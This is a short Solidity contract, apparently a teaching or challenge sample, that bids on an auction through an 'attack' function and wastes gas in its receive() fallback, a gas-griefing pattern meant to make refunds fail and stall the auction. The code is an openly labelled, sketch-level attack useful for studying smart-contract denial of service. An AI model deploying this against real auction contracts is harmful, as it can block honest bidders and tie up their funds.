// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

interface IAuction {
    function bid() external payable;
}

contract GGA {
    function attack(address _auction) external payable {
        IAuction(_auction).bid{value: msg.value}();
    }

    receive() external payable {
        keccak256("just wasting some gas...");
        keccak256("just wasting some gas...");
        keccak256("just wasting some gas...");
        keccak256("just wasting some gas...");
        keccak256("just wasting some gas...");
        //etc...
    }
}
